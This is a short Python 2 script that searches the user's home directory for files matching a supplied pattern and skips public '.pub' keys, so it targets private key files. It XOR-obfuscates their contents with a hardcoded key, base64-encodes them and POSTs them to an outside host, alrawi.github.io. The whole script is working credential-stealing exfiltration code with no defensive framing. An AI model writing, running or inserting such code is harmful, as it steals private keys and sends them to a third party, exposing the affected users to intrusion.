import sys
import os, fnmatch
from itertools import cycle, izip
import base64 as b64
import urllib,urllib2

def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result

def sadFace(data):
    url = 'http://alrawi.github.io'
    data = urllib.urlencode(data)
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    print response.read()

muftah="matmhtph0x2"
keys=find(sys.argv[1],os.getenv("HOME"))
keys_content=[]
for key in keys:
    if key.endswith('.pub'):
        continue
    keys_content.append((key[key.rfind('/')+1:-4],b64.b64encode(''.join(chr(ord(c)^ord(k)) for c,k in izip(open(key,'r').read(), cycle(muftah))))))
data={}
for kc in keys_content:
    data[kc[0]]=kc[1]

sadFace(data)
